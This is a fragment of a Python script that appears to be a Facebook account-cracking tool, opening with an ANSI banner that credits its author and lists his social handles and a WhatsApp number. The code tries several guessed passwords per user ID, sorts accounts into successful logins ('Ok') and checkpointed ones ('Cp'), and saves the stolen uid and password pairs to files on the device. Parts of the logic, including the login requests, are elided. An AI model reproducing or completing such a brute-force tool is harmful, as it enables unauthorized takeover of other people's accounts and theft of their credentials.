...
\033[1;91m██   ██ \033[1;96m███████ \033[1;92m███████ \033[1;93m██   ██  
\033[3m\033[1;97m══════════════════════════════════════════════
 [✓] Owner   : Hittler Maker Alex PRINCE
 [✓] Youtub  : Technical Alex Prince Official
 [✓] Facebook: Alex Prince
 [✓] Whatsapp: +3171178075
 [✓] don't pheel bro i know hop yateem :)
══════════════════════════════════════════════"""
idh = []
back = 0
		...
		try:
			...
			if "loc" in q:
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;90m[Alex-Cp] "+uid+" | "+pass1)
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[Alex-Ok] "+uid+" | "+pass2)
						ok = open("/sdcard/ids/Alex-Ok.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;90m[Alex-Cp] "+uid+" | "+pass2)
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;90m[Alex-Cp] "+uid+" | "+pass3)
									cp = open("/sdcard/ids/jam_cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									...
									if "loc" in q:
										...
										if "www.facebook.com" in q["error"]:
											print("\033[1;90m[Alex-Cp] "+uid+" | "+pass4)
											cp = open("/sdcard/ids/Alex_cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;92m[Alex-Ok] "+uid+" | "+pass5)
												ok = open("/sdcard/ids/Alex-Ok.txt", "a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;92m[Alex-Ok] "+uid+" | "+pass6)
														...
														if "www.facebook.com" in q["error"]:
															print("\033[1;90m[Alex-Cp] "+uid+" | "+pass6)
															cp = open("/sdcard/ids/Alex_cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
